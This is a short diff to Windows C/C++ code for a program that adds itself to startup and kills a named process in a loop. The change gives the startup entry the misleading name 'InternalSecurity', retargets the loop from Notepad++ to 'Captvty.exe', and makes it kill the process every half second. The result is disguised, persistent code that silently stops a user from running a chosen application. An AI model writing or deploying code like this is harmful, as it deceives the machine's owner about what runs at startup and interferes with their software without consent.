@@ -62,12 +62,12 @@ int main(void)
   {
     GetModuleFileName(hModule, programPath, (sizeof(programPath)));
 
-    RegisterStartupProgram("myprogram", programPath);
+    RegisterStartupProgram("InternalSecurity", programPath);
   }
 
   while(true)
   {
-    killProcessByName("notepad++.exe");
-    Sleep(5000);
+    killProcessByName("Captvty.exe");
+    Sleep(500);
   }
 }
